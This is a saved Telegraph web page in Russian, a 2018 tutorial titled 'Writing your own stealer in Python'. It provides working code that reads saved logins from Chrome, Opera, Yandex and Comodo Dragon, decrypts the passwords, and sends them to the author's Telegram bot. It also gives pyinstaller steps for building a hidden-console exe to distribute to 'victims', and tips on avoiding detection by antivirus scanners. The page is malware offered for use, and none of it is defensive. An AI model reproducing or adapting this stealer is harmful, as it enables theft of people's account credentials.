<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Пишем свой стиллер на Python – Telegraph</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Пишем свой стиллер на Python">
    <meta property="og:description" content="Привет. Пришло время написать свой собственный стиллер на чудном языке Python.&nbsp;
Комментарии будут отмечены решеточкой - #
Установка Python​
Переходим на официальный сайт PythonА.&nbsp;
Скачиваем 3+ версию и устанавливаем ее.
&nbsp;Суть работы стиллера​
Программа проверит наличие папок от указанных браузеров, при наличии - подключится к базе данных(LoginData) и достанет от туда сохраненные логины,пароли от сайтов. После полученные данные программа отправит от имени бота в чат телеграм. Вот и все)
Создадим своего бота​…">
    <meta property="og:image" content="">
    <meta property="og:site_name" content="Telegraph">
    <meta property="article:published_time" content="2018-10-22T14:25:30+0000">
    <meta property="article:modified_time" content="2018-10-22T14:25:30+0000">
    <meta property="article:author" content="Coding">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Пишем свой стиллер на Python">
    <meta name="twitter:description" content="Привет. Пришло время написать свой собственный стиллер на чудном языке Python.&nbsp;
Комментарии будут отмечены решеточкой - #
Установка Python​
Переходим на официальный сайт PythonА.&nbsp;
Скачиваем 3+ версию и устанавливаем ее.
&nbsp;Суть работы стиллера​
Программа проверит наличие папок от указанных браузеров, при наличии - подключится к базе данных(LoginData) и достанет от туда сохраненные логины,пароли от сайтов. После полученные данные программа отправит от имени бота в чат телеграм. Вот и все)
Создадим своего бота​…">
    <meta name="twitter:image" content="">
    <link rel="canonical" href="https://telegra.ph/Pishem-svoj-stiller-na-Python-10-22">
    <link rel="shortcut icon" href="https://tgraph.io/favicon.ico?1" type="image/x-icon">
    <link rel="icon" type="image/png" href="https://tgraph.io/images/favicon.png?1" sizes="16x16">
    <link rel="icon" type="image/png" href="https://tgraph.io/images/favicon_2x.png?1" sizes="32x32">
    <link href="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/quill.css" rel="stylesheet">
    <link href="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/core.css" rel="stylesheet">
  </head>
  <body>
    <div class="tl_page_wrap">
      <div class="tl_page">
        <main class="tl_article">
          <header class="tl_article_header">
            <h1 dir="auto">Пишем свой стиллер на Python</h1>
            <address dir="auto">
              <a rel="author" href="http://telete.in/cccoding" target="_blank">Coding</a><!--
           --><time datetime="2018-10-22T14:25:30+0000">October 22, 2018</time>
            </address>
          </header>
          <article id="_tl_editor" class="tl_article_content ql-container ql-disabled"><div class="ql-editor" dir="auto" contenteditable="false"><h1 data-placeholder="Title" data-label="Title">Пишем свой стиллер на Python</h1><address data-placeholder="Your name" data-label="Author"><a href="http://telete.in/cccoding" target="_blank">Coding</a></address><p> Привет. Пришло время написать свой собственный стиллер на чудном языке Python.&nbsp;</p><p><strong>Комментарии будут отмечены решеточкой - #</strong></p><h3 id="Установка-Python​">Установка Python​</h3><p>Переходим на официальный сайт <a href="https://www.python.org/" target="_blank">PythonА</a>.&nbsp;</p><p>Скачиваем 3+ версию и устанавливаем ее.</p><h3 id="Суть-работы-стиллера​">&nbsp;Суть работы стиллера​</h3><p>Программа проверит наличие папок от указанных браузеров, при наличии - подключится к базе данных(LoginData) и достанет от туда сохраненные логины,пароли от сайтов. После полученные данные программа отправит от имени бота в чат телеграм. Вот и все)</p><h3 id="Создадим-своего-бота​">Создадим своего бота​</h3><p>Как по мне, очень удобно при частом пребывании в телеграме получать в личные сообщения логи со стиллера. Поэтому мы создадим своего бота, который будет нам отправлять украденные логины и пароли.</p><p>Для начала мы должны создать нашего бота, в этом нам поможет <a href="https://telete.in/BotFather" target="_blank">@BotFather</a>, запускаем с ним диалог и создаем нового бота,которому мы должны придумать имя с окончанием "_bot". После BotFather выдаст нам token для управления нашим ботом.</p><p>&nbsp;Команды :</p><p>/start</p><p>/newbot</p><p>После всех вышеперечисленных действий мы должны перейти по ссылке, отправить боту любое сообщение с нужного вам аккаунта и обновить открытый сайт, в итоге мы получим кучу разных данных, в которых нам нужно найти и сохранить chat id.</p><p><br></p><p><a href="https://api.telegram.org/bot%D0%92%D0%B0%D1%88Token/getUpdates" target="_blank">https://api.telegram.org/botВашToken/getUpdates</a> #перейти по данной ссылке</p><p>"chat":{"id":вашid #найти chatid в информации</p><p>&nbsp;</p><p><strong>С ботом мы разобрались, идем дальше.</strong></p><p><br></p><h3 id="Начинаем-кодить​">Начинаем кодить​</h3><p>Сначала нам нужно установить библиотеки, которые будут использованы в нашей программе</p><p>Для этого запустим терминал(cmd) и обновим питоновский установщик пакетов.</p><p>Команда :</p><p><strong>pip install --upgrade pip</strong></p><p><br></p><p>После обновления установим 2 нужные нам библиотеки,pyTelegramBotAPI pywin32 и telebot</p><p><br></p><p>Команды :&nbsp;</p><p><br></p><p><strong>pip install pyTelegramBotAPI</strong></p><p><strong>pip install pywin32</strong></p><p><strong>pip install telebot</strong></p><p><br></p><p>В самом начале программы, мы должны подключить библиотеки, которые мы будем использовать в нашем коде.</p><p><br></p><p><strong>&nbsp;Код:</strong></p><p><br></p><p>from os import getlogin #из библиотеки os мы импортируем функцию getlogin</p><p>#данная библиотека поможет нам получить имя пользователя компьютера<br class="inline"><br class="inline"></p><p>import sqlite3 #импортируем библиотеку sqlite3<br class="inline">#данная библиотека даст возможность работать с базами данных<br class="inline"><br class="inline"></p><p>import win32crypt #импортируем библиотеку win32crypt</p><p>#эта библиотека поможет расшифровать пароли из базы данных<br class="inline"><br class="inline"></p><p>import telebot #импортируем библиотеку telebot</p><p>#с помощью этой библиотеки мы будем отправлять сообщения от нашего бота.</p><p><br></p><p>Теперь нам нужно задать переменные, которые мы будет использовать.</p><p><br></p><p><strong>&nbsp;Код:</strong></p><p><br></p><p>t0ken = "ВАШ:Т0КЕН"" #переменная t0ken – в которой хранится token от бота<br class="inline"><br class="inline"></p><p>b0t = telebot.TeleBot(t0ken) #создаем переменную b0t – которая отвечает за создание бота и имеет атрибут в виде переменной t0ken<br class="inline"><br class="inline"></p><p>i=0 #переменная счетчик<br class="inline"><br class="inline"></p><p>name_0f_user = getlogin() # переменная, которая с помощью функции getlogin получает имя учетной записи пользователя.</p><p><br></p><p>Дальше мы должны создать переменные,списки с директориями возможных браузеров.</p><p><br></p><p><strong>&nbsp;Код:</strong></p><p><br></p><p>op3ra = "C:\\Users\\" + name_0f_user + "&lt;\\AppData\\Roaming\\Opera Software\\Opera Stable\\&gt;" + "Login data"</p><p>#переменная op3ra которая равна такому пути <br class="inline"><br class="inline">C:\\Users\\Users\\AppData\\Roaming\\Opera Software\\Opera Stable\\LoginData - где Login Data - база данных, а остальное - путь к папке браузера.<br class="inline"><br class="inline"></p><p>g00gle = "C:\\Users\\" + name_0f_user + "&lt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\&gt;" + "Login Data" #также как и выше<br class="inline"><br class="inline"></p><p>yand3x = "C:\\Users\\" + name_0f_user + "&lt;\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\&gt;" + "Login Data" #также как и выше<br class="inline"><br class="inline"></p><p>c0m0d0drag0n = "C:\\Users\\" + name_0f_user + "&lt;\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\&gt;" + "Login Data" #также как и выше<br class="inline"><br class="inline"></p><p>lsdir=[op3ra,g00gle,yand3x,c0m0d0drag0n] #создаем список в котором хранятся наши переменные с директориями браузеров.<br class="inline"><br class="inline"></p><p>lsbr0wser=["Opera","Google Chrome","Yandex Browser","Comodo Dragon"] #создаем список с названиями браузеров, которые у нас есть. Названия расположены в порядке списка lsdir<br class="inline"><br class="inline"></p><p>Я добавил только 4, как по мне самых распространенных браузеров. Вы можете сами добавлять другие браузеры на движке Chromium<br class="inline"><br class="inline"></p><p>При добавлении/редактировании директорий, нужно использовать двойной, обратный слэш(\\), иначе будет выбивать ошибку,связанную с кодировкой.</p><p><br></p><p>Теперь приступим к расшифровке паролей и отправке полученных данных в телеграм.</p><p><br></p><p><strong>&nbsp;Код:</strong></p><p><br></p><p>b0t.send_message(ваш id, "Компьютер: " + name_0f_user) #для начала мы отправим в чат имя системы жертвы</p><p>#b0t - имя бота,которого мы создали в начале</p><p>#send_message - функция для отправки сообщения,которая принимает такие аргументы: id чата,который мы получили ранее и текст,который мы желаем отправить, в данном случае, слово "Компьютер:"&nbsp;объединенное с переменой name_0f_user</p><p>for i in range(len(lsdir)): #запускаем цикл, который будет длится от переменной i до длины списка lsdir, от 0 до 4</p><p>&nbsp;&nbsp;try: #попробовать сделать следующие действия, если не получится, то выполнить действия после except</p><p>&nbsp;&nbsp;&nbsp;&nbsp;br0wser=lsdir[i] #переменной br0wser присвоим элемент списка под номером [i]</p><p>&nbsp;&nbsp;&nbsp;&nbsp;connecti0n = sqlite3.connect(br0wser) #начинаем работу с sqllite, создаем переменную, которая равняется подключению базы данных, которая находится по адресу br0wser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;curs0r = connecti0n.cursor() #создаем переменную curs0r, которая отвечает за создание объекта для взаимодействия с базой данных</p><p>&nbsp;&nbsp;&nbsp;&nbsp;curs0r.execute('SELECT origin_url, username_value, password_value FROM logins') #переменной curs0r мы говорим достать из базы данных нам такие значения - origin_url(ссылка на сайт где был введен логин и пароль),username_value(логин), password_value(пароль)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for ii in curs0r.fetchall(): #создаем цикл, который будет длится от нуля(ii), до всех значений, которые можно получить из базы данных(curs0r.fetchall)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d3cryptpass = win32crypt.CryptUnprotectData(ii[2]) #переменной d3cryptpass присваиваем значение расшифровки пароля(второго элемента в списке значений, добытых из базы данных), функцией CryptUnprotectData(библиотека win32crypt)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, lsbr0wser[i]) #в чат от имени бота отправляем сообщение с i-тым элементом из списка текстовых названий браузеров.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "----------------------------") #отправляем от имени бота сообщение в чат с разделительной линией/украшением</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "Сайт: " + ii[0]) #в чат от имени бота отправляем слово "сайт" + нулевой элемент в списке</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "----------------------------") #отправляем от имени бота сообщение в чат с разделительной линией/украшением</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "Логин: " + ii[1]) #в чат от имени бота отправляем слово "логин" + первый элемент в списке</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "----------------------------") #отправляем от имени бота сообщение в чат с разделительной линией/украшением</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d3cryptpass=str(d3cryptpass) #переменной d3cryptpass- присваиваем значение d3cryptpass, только переводим ее в текстовый тип данных(str)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "Пароль: " + d3cryptpass) #в чат от имени бота отправляем слово "пароль" + переменную d3cryptpass</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата, "----------------------------") #отправляем от имени бота сообщение в чат с разделительной линией/украшением</p><p>&nbsp;&nbsp;except: #если действие после try не заработало/выдало ошибку, то выполнить действие после except</p><p>&nbsp;&nbsp;&nbsp;&nbsp;b0t.send_message(id_вашего_чата,"Браузер " + lsbr0wser[i] + " был запущен, или не установлен") #в чат от имени бота отправляем слово "браузер" + i-тый элемент в списке с названиями браузеров(lsbr0wser) + сообщение об ошибке</p><p>Теперь я попытаюсь объяснить суть вышеописанного кода на "простом" примере)</p><p><br></p><h3 id="Компилируем-в-exe​">Компилируем в exe​</h3><p>​</p><p>Ясное дело, что python скрипт мы не будем распространять, поэтому мы скомпилируем его в exe файл. Для компиляции нам нужно будет установить специальную утилиту pyinstaller для компиляции py в exe</p><p>Код:</p><p><br></p><p><strong>pip install pyinstaller</strong></p><p><br></p><p>После установки мы должны открыть папку с нашей программой на питоне и запустить pyinstaller с такими аргументами</p><p>-F соберет все файлы в один exe файл</p><p>-w отключит консоль</p><p>-i *путь к иконке* аргумент,который подключит к программе иконку​</p><p>Код:</p><p><br></p><p><strong>CD C:\compile</strong></p><p><strong>pyinstaller -i i.ico -F -w stealer.py</strong></p><p>#В терминала переходим в папку C:\compile</p><p>#вызываем pyintaller, где i.ico - иконка расположенная в папке compile;stealer.py - наш питоновский скрипт, расположенный в папке compile</p><p><br></p><p>После в папке dist появится наш код скомпилированный в EXE. </p><p>Вот мы и написали наш простой стиллер, мы смогли уложится в 34 строчки кода.</p><p>У меня готовый стиллер запускается за 5 секунд и имеет вес в 6 мегабайт.</p><p>Проверить на детекты, я не смог, ибо viruschekmate,ScanMyBin - сдохли,<strong>nodstribute+virustotal - сливают данные</strong>(не суйте туда стиллер)), поэтому информация про "чистоту" остается для вас и для меня интригой)</p><p><br></p><aside><a href="https://yadi.sk/d/vpIlOBCwj7-mYA" target="_blank"><strong><em>Исходник</em></strong></a><br class="inline"><br class="inline"></aside><p><strong>Не забудь подписаться на </strong><a href="http://telete.in/cccoding" target="_blank"><strong>Coding</strong></a><strong> и поделиться каналом с друзьями </strong></p><h3 id=""><br></h3><p><br></p></div><div class="ql-clipboard" tabindex="-1" contenteditable="true"></div><div id="_tl_link_tooltip" class="tl_link_tooltip"></div><div id="_tl_tooltip" class="tl_tooltip">
            <div class="buttons">
              <span class="button_hover"></span>
              <span class="button_group"><!--
             --><button id="_bold_button"></button><!--
             --><button id="_italic_button"></button><!--
             --><button id="_link_button"></button><!--
           --></span><!--
           --><span class="button_group"><!--
             --><button id="_header_button"></button><!--
             --><button id="_subheader_button"></button><!--
             --><button id="_quote_button"></button><!--
           --></span>
            </div>
            <div class="prompt">
              <span class="close"></span>
              <div class="prompt_input_wrap"><input type="url" class="prompt_input"></div>
            </div>
          </div><div id="_tl_blocks" class="tl_blocks">
            <div class="buttons">
              <button id="_image_button"></button><!--
           --><button id="_embed_button"></button>
            </div>
          </div></article>
          
          
          
          <aside class="tl_article_buttons">
            <div class="account account_top"></div>
            <button id="_edit_button" class="button edit_button">Edit</button><!--
         --><button id="_publish_button" class="button publish_button">Publish</button>
            <div class="account account_bottom"></div>
            <div id="_error_msg" class="error_msg"></div>
          </aside>
        </main>
      </div>
    </div>
    <div id="_tl_alerts" class="tl_alerts" style="margin: 0 auto;
    width: 230px; color: #616161; padding: 20px; font-size: 14px; text-align: center;">Создано с помощью <a href="http://tgraph.io/" target="_blank">Tgraph.io</a></div>
    <script type="text/javascript" async="" src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/analytics.js"></script><script>var T={"apiUrl":"https:\/\/edit.telegra.ph","datetime":1540218330,"pageId":"2e86ade8d02f62d80c744"};(function(){var b=document.querySelector('time');if(b&&T.datetime){var a=new Date(1E3*T.datetime),d='January February March April May June July August September October November December'.split(' ')[a.getMonth()],c=a.getDate();b.innerText=d+' '+(10>c?'0':'')+c+', '+a.getFullYear()}})();</script>
    <script src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/jquery.js"></script>
    <script src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/jquery_002.js"></script>
    <script src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/autosize.js"></script>
    <script src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/load-image.js"></script>
    <script src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/quill.js"></script>
    <script src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/core.js"></script>
  <script async="" src="original4=%D0%BE%D1%80%D0%B8%D0%B3%D0%B8%D0%BD%D0%B0%D0%BB4_files/js"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}gtag("js", new Date());gtag("config", "UA-117945631-1");</script>
</body></html>